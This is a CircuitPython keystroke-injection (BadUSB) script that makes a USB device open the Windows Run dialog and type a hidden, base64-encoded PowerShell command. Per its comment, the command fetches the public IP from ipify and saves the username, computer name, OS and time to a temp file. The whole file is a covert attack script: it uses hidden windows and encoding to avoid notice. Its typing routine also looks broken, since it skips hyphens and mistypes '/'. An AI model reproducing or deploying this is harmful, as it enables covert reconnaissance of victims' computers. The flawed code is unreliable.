import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from time import sleep

kbd = Keyboard(usb_hid.devices)
sleep(0.6)

numbers = [
    Keycode.ZERO, Keycode.ONE, Keycode.TWO, Keycode.THREE, Keycode.FOUR,
    Keycode.FIVE, Keycode.SIX, Keycode.SEVEN, Keycode.EIGHT, Keycode.NINE
]

def type_simple(text):
    for c in text:
        if c.isalpha():
            if c.isupper():
                kbd.press(Keycode.SHIFT, getattr(Keycode, c))
            else:
                kbd.press(getattr(Keycode, c.upper()))
            kbd.release_all()
        elif c.isdigit():
            kbd.press(numbers[int(c)])
            kbd.release_all()
        elif c == ' ':
            kbd.press(Keycode.SPACE)
            kbd.release_all()
        elif c == '+':
            kbd.press(Keycode.SHIFT, Keycode.EQUALS)
            kbd.release_all()
        elif c == '/':
            kbd.press(Keycode.SHIFT, Keycode.LEFT_BRACKET)
            kbd.release_all()
        elif c == '=':
            kbd.press(Keycode.EQUALS)
            kbd.release_all()
        sleep(0.01)

# ---------------- RUN DIALOG ----------------
kbd.press(Keycode.WINDOWS, Keycode.R)
kbd.release_all()
sleep(0.4)

# ---------------- ENCODED POWERSHELL ----------------
# Decodes to:
# $ip=Invoke-RestMethod https://api.ipify.org;
# $u=$env:USERNAME;
# $c=$env:COMPUTERNAME;
# $o=(Get-CimInstance Win32_OperatingSystem).Caption;
# $t=Get-Date -Format yyyy-MM-dd_HH:mm:ss;
# "IP:$ip | User:$u | PC:$c | OS:$o | Time:$t" > $env:TEMP\ip.txt

encoded = (
    "powershell -NoP -NonI -W Hidden -EncodedCommand "
    "JABpAHAAIAA9ACAASQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAAaAB0AHQAcABzADoALwAvAGEAcABpAC4AaQBwAGkAZgB5AC4AbwByAGcAOwAkAHUAPQAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFADsAJABjAD0AJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFADsAJABvAD0AKABHAGUAdAAtAEMAaQBtAEkAbgBzAHQAYQBuAGMAZQAgAFcAaQBuADMAMgBfAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtACkALgBDAGEAcAB0AGkAbwBuADsAJAB0AD0ARwBlAHQALQBEAGEAdABlACAALQBGAG8AcgBtAGEAdAAgAHkAeQB5AHkALQBNAG0ALQBkAGQAXwBIAGgAOgBtAG0AOgBzAHMAOwAiAEkAUAA6ACQAaQBwACAAfAAgAFUAcwBlAHIAOgAkAHUAIAAfACAAUABDADoAJABjACAAfAAgAE8AUwA6ACQAbwAgAHwAIABUAGkAbQBlADoAJAB0ACIAIAA+ACAAJABlAG4AdgA6AFQARQBNAFAAXABpAHAA"
)

type_simple(encoded)

kbd.press(Keycode.ENTER)
kbd.release_all()
